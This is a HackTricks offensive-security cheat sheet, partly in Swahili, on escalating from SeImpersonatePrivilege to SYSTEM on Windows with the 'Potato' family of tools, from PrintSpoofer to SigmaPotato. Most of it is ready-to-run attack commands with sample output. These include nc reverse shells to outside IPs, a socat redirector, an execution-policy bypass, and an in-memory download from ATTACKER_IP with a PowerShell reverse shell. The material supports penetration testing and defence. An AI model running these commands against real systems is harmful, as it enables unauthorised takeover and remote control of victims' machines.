# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato haifanyi kazi** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Mahitaji na matatizo ya kawaida

Tekiniki zote zifuatazo zinategemea kuabusu huduma yenye mamlaka inayoweza kufanya impersonation kutoka kwa muktadha unaoshikilia mojawapo ya vibali vifuatavyo:

- SeImpersonatePrivilege (kawaida zaidi) au SeAssignPrimaryTokenPrivilege
- High integrity haihitajiki ikiwa token tayari ina SeImpersonatePrivilege (kawaida kwa akaunti za huduma nyingi kama IIS AppPool, MSSQL, n.k.)

Angalia vibali haraka:
```cmd
whoami /priv | findstr /i impersonate
```
Vidokezo vya uendeshaji:

- Ikiwa shell yako inaendesha chini ya tokeni iliyo na vizuizi bila SeImpersonatePrivilege (kawaida kwa Local Service/Network Service katika muktadha fulani), rejesha ruhusa za chaguo-msingi za akaunti kwa kutumia FullPowers, kisha endesha Potato. Mfano: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). Katika mazingira yaliyohifadhiwa ambapo Spooler imezimwa baada ya PrintNightmare, pendelea RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requires an OXID resolver reachable on TCP/135. Ikiwa egress imezuiwa, tumia redirector/port-forwarder (ona mfano hapa chini). Older builds needed the -f flag.
- EfsPotato/SharpEfsPotato abuse MS-EFSR; ikiwa pipe moja imezuiwa, jaribu pipes mbadala (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; jaribu pipe/transport tofauti au hakikisha huduma lengwa inaendesha.

## Demo ya Haraka

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Vidokezo:
- Unaweza kutumia -i kuanzisha mchakato wa mwingiliano katika konsoli ya sasa, au -c kuendesha one-liner.
- Inahitaji Spooler service. Ikiwa imezimwa, hii itashindwa.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ikiwa outbound 135 imezuiwa, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato ni primitive mpya ya matumizi mabaya ya COM iliyotolewa mwishoni mwa 2022 inayolenga huduma ya **PrintNotify** badala ya Spooler/BITS. Binary inaunda PrintNotify COM server, inaibadilisha na `IUnknown` bandia, kisha kusababisha callback yenye mamlaka kupitia `CreatePointerMoniker`. Wakati huduma ya PrintNotify (inayoendesha kama **SYSTEM**) inarudisha muunganiko, mchakato unatengeneza nakala ya token iliyorejeshwa na kuzindua payload iliyotolewa kwa mamlaka kamili.

Key operational notes:

* Inafanya kazi kwenye Windows 10/11 na Windows Server 2012–2022 mradi tu huduma ya Print Workflow/PrintNotify imewekwa (ipo hata pale Spooler ya zamani imezimwa baada ya PrintNightmare).
* Inahitaji muktadha unaoita kuwa na **SeImpersonatePrivilege** (kawaida kwa IIS APPPOOL, MSSQL, na akaunti za huduma za scheduled-task).
* Inakubali amri ya moja kwa moja au hali ya kuingiliana ili uweze kubaki ndani ya console ya awali. Example:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Kwa sababu inategemea kabisa COM, hakuna named-pipe listeners au external redirectors vinavyohitajika, na hivyo inaweza kutumika moja kwa moja kama mbadala kwenye hosts ambapo Defender inazuia RPC binding ya RoguePotato.

Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Ushauri: Ikiwa pipe moja itashindwa au EDR itakuzuia, jaribu pipes nyingine zinazoungwa mkono:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Vidokezo:
- Inafanya kazi kwenye Windows 8/8.1–11 na Server 2012–2022 wakati SeImpersonatePrivilege inapatikana.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato hutoa aina mbili zinazolenga objekti za DCOM za huduma ambazo kwa chaguo-msingi huweka RPC_C_IMP_LEVEL_IMPERSONATE. Jenga au tumia binaries zilizotolewa na endesha amri yako:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato inaongeza sifa za kisasa kama in-memory execution kupitia .NET reflection na PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Marejeleo

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Rejesha vibali vya tokeni vya chaguo-msingi kwa akaunti za huduma](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato kwa SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Kufichua Mtandao wa Relay na Uendeshaji wa Ndani wa Operesheni ya Kushambulia kwa Usiri](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
